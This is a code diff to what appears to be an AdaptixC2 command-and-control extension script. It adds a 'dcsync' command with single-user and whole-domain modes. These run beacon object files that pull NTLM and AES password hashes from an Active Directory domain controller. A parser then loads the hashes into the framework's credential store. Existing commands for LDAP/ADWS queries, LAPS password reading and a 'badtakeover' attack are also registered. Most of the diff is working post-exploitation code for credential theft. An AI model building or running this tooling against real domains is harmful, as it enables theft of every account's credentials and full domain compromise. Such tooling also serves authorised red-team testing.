@@ -4,8 +4,6 @@ var metadata = {
 };
 
 
-/// ADWSsearch
-
 
 var cmd_adwssearch = ax.create_command("adwssearch", "Executes ADWS query", "adwssearch (objectClass=*) -attributes *,ntsecuritydescriptor --dc DC1");
 cmd_adwssearch.addArgString("query", true);
@@ -24,6 +22,8 @@ cmd_adwssearch.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
     ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
 });
+
+
 
 
 
@@ -50,7 +50,136 @@ cmd_badtakeover.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) 
 
 
 
-/// LDAPsearch
+
+let dcsync_handler = function (task) {
+    const lines = task.text.split(/\r?\n/);
+    const results = [];
+    let dc = "";
+    let currentName = null;
+    let currentObjectType = null;
+
+    const reDC = /^\[\*\]\s+Discovered DC:\s+(.+)$/;
+    const reObject = /^\[\*\]\s+(User|Computer|Trust account|Object):\s+(.+)$/;
+    const reNT = /^nt:\s*([0-9a-f]{32})$/;
+    const reAES256 = /^aes256:\s*([0-9a-f]{64})$/;
+    const reAES128 = /^aes128:\s*([0-9a-f]{32})$/;
+
+    function parseName(rawName) {
+        const idx = rawName.indexOf("\\");
+        if (idx === -1) return { name: rawName, realm: null };
+        return {
+            name: rawName.slice(idx + 1),
+            realm: rawName.slice(0, idx)
+        };
+    }
+
+    function pushHash(hashType, hashValue) {
+        if (!currentName || !hashValue) return;
+
+        const nameParts = parseName(currentName);
+        const tag = currentObjectType === "Computer" ? "computer" : "";
+
+        results.push({
+            username: nameParts.name,
+            type: hashType,
+            password: hashValue,
+            storage: "dcsync",
+            tag: tag,
+            realm: nameParts.realm,
+            host: dc
+        });
+    }
+
+    for (const line of lines) {
+        if (results.length > 1000) {
+            ax.credentials_add_list(results);
+            results.length = 0;
+        }
+
+        const trimmed = line.trim();
+        if (!trimmed) continue;
+
+        let m = reDC.exec(trimmed);
+        if (m && !dc) { dc = m[1]; continue; }
+
+        m = reObject.exec(trimmed);
+        if (m) {
+            currentObjectType = m[1];
+            currentName = m[2];
+            continue;
+        }
+
+        if (!currentName) continue;
+
+        m = reNT.exec(trimmed);
+        if (m) { pushHash("ntlm", m[1]); continue; }
+
+        m = reAES256.exec(trimmed);
+        if (m) { pushHash("aes256", m[1]); continue; }
+
+        m = reAES128.exec(trimmed);
+        if (m) pushHash("aes128", m[1]);
+    }
+
+    if (results.length) ax.credentials_add_list(results);
+};
+
+var _cmd_dcsync_single = ax.create_command( "single", "Perform a DCSync operation on a single user", "dcsync single jane.doe -dc dc01.corp.local --ldaps" );
+_cmd_dcsync_single.addArgString("target", true, "Target username or distinguished name");
+_cmd_dcsync_single.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
+_cmd_dcsync_single.addArgFlagString("-dc", "dc_address", false, "Domain Controller address");
+_cmd_dcsync_single.addArgBool("--ldaps", "Use LDAPS (port 636)");
+_cmd_dcsync_single.addArgBool("--only-nt", "Only ntlm hashes");
+_cmd_dcsync_single.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
+
+    function identifyInputType(input) {
+        const usernameRegex = /^[a-zA-Z0-9._-]{1,64}$/;
+        const dnRegex = /^(?:[A-Z]+=[^,]+)(?:,(?:[A-Z]+=[^,]+))*$/i;
+        if (dnRegex.test(input)) {
+            return 1;
+        } else if (usernameRegex.test(input)) {
+            return 0;
+        } else {
+            return 0;
+        }
+    }
+
+    let target = parsed_json["target"];
+    let is_dn = identifyInputType(target);
+    let ou_path = parsed_json["ou_path"] || "";
+    let dc_address = parsed_json["dc_address"] || "";
+    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
+    let only_nt = parsed_json["--only-nt"] ? 1 : 0;
+
+    let bof_params = ax.bof_pack("cstr,int,cstr,cstr,int,int", [target, is_dn, ou_path, dc_address, use_ldaps, only_nt]);
+    let bof_path = ax.script_dir() + "_bin/dcsync-single." + ax.arch(id) + ".o";
+    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, `DCSyncing user ${target}...`, dcsync_handler);
+});
+
+var _cmd_dcsync_all = ax.create_command( "all", "Perform DCSync operations for all users in the domain", "dcsync all -ou 'OU=Users,DC=corp,DC=local' -dc dc01.corp.local --ldaps" );
+_cmd_dcsync_all.addArgFlagString("-ou", "ou_path", false, "OU path to search (optional)");
+_cmd_dcsync_all.addArgFlagString("-dc", "dc_address", false, "Domain Controller address");
+_cmd_dcsync_all.addArgBool("--ldaps", "Use LDAPS (port 636)");
+_cmd_dcsync_all.addArgBool("--only-nt", "Only ntlm hashes");
+_cmd_dcsync_all.addArgBool("--only-users", "Only User and Trust accounts");
+_cmd_dcsync_all.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines){
+    let ou_path = parsed_json["ou_path"] || "";
+    let dc_address = parsed_json["dc_address"] || "";
+    let use_ldaps = parsed_json["--ldaps"] ? 1 : 0;
+    let only_nt = parsed_json["--only-nt"] ? 1 : 0;
+    let only_users = parsed_json["--only-users"] ? 1 : 0;
+
+    let bof_params = ax.bof_pack("cstr,cstr,int,int,int", [ou_path, dc_address, use_ldaps, only_nt, only_users]);
+    let bof_path = ax.script_dir() + "_bin/dcsync-all." + ax.arch(id) + ".o";
+    ax.execute_alias_handler(id, cmdline, `execute bof ${bof_path} ${bof_params}`, "DCSyncing all users...", dcsync_handler);
+});
+
+var cmd_dcsync = ax.create_command( "dcsync", "Perform DCSync operations (DCSync-BOF)", "dcsync {subcommand} [options]" );
+cmd_dcsync.addSubCommands([_cmd_dcsync_single]);
+cmd_dcsync.addSubCommands([_cmd_dcsync_all]);
+
+
+
 
 
 var cmd_ldapsearch = ax.create_command("ldapsearch", "Executes LDAP query", "ldapsearch (objectClass=*) -a *,ntsecuritydescriptor -c 40 -s 2 --dc DC1");
@@ -136,7 +265,8 @@ var cmd_ldapq = ax.create_command("ldapq", "Ldap query objects", "ldapq computer
 cmd_ldapq.addSubCommands([_cmd_ldapq_computers]);
 
 
-/// ReadLAPS
+
+
 
 var cmd_readlaps = ax.create_command("readlaps", "Read LAPS password for a computer", "readlaps -dc dc01.domain.local -target WINCLIENT");
 cmd_readlaps.addArgFlagString("-dc", "dc", "Target domain controller (e.g., 'dc01.domain.local'). Hostname preferred over IP for LDAP.", "");
@@ -150,12 +280,12 @@ cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
     let target_dn = parsed_json["target_dn"];
 
     if (!target && !target_dn) {
-        throw new Error("Error: Either -target (sAMAccountName) or -target-dn (Distinguished Name) must be specified");
+        throw new Error("Either -target (sAMAccountName) or -target-dn (Distinguished Name) must be specified");
         return;
     }
 
     if (target && target_dn) {
-        throw new Error("Error: Cannot specify both -target and -target-dn");
+        throw new Error("Cannot specify both -target and -target-dn");
         return;
     }
 
@@ -206,7 +336,7 @@ cmd_readlaps.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
 
 
 
-var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_ldapsearch, cmd_ldapq, cmd_readlaps]);
+var group_exec = ax.create_commands_group("AD-BOF", [cmd_adwssearch, cmd_badtakeover, cmd_dcsync, cmd_ldapsearch, cmd_ldapq, cmd_readlaps]);
 ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
 
 
@@ -214,3 +344,4 @@ ax.register_commands_group(group_exec, ["beacon", "gopher"], ["windows"], []);
 ax.script_import(ax.script_dir() + "ADCS-BOF/ADCS.axs")
 ax.script_import(ax.script_dir() + "Kerbeus-BOF/kerbeus.axs")
 ax.script_import(ax.script_dir() + "SQL-BOF/SQL.axs")
+ax.script_import(ax.script_dir() + "LDAP-BOF/LDAP.axs")
